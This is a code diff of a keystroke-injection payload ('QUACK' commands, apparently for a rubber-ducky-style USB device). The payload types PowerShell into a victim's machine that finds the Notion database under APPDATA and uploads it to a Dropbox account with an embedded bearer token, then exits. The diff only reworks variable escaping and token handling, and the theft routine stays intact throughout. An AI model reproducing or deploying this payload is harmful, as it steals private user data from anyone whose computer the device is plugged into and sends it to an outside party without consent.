@@ -24,36 +24,31 @@ QUACK DELAY 1000
 QUACK STRING PowerShell
 QUACK ENTER
 QUACK DELAY 2000
-QUACK STRING $accessToken='$DROPBOX_ACCESS_TOKEN'
-QUACK ENTER
 
 # Settings about Notion DB
-QUACK STRING $NotionPath = Join-Path -Path $env:APPDATA -ChildPath 'Notion'
+QUACK STRING \$NotionPath = Join-Path -Path \$env:APPDATA -ChildPath 'Notion'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $NotionDatabasePath = Join-Path -Path $NotionPath -ChildPath 'notion.db'
+QUACK STRING \$NotionDatabasePath = Join-Path -Path \$NotionPath -ChildPath 'notion.db'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $authHeader = @{Authorization = 'Bearer $accessToken'}
+QUACK STRING \$uploadUrl = 'https://content.dropboxapi.com/2/files/upload'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $uploadUrl = 'https://content.dropboxapi.com/2/files/upload'
+QUACK STRING \$dropboxFilePath = '/notion.db'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $dropboxFilePath = '/notion.db'
+QUACK STRING \$headers = @{}
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers = @{}
+QUACK STRING \$headers.Add('Authorization', 'Bearer $DROPBOX_ACCESS_TOKEN')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Authorization', 'Bearer $accessToken')
+QUACK STRING \$headers.Add('Dropbox-API-Arg', '{\"path\":\"' + \$dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Dropbox-API-Arg', '{\"path\":\"' + $dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
+QUACK STRING \$headers.Add('Content-Type', 'application/octet-stream')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Content-Type', 'application/octet-stream')
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $NotionDatabasePath; exit;
+QUACK STRING Invoke-RestMethod -Uri \$uploadUrl -Headers \$headers -Method Post -Body \$NotionDatabasePath; exit;
 QUACK ENTER
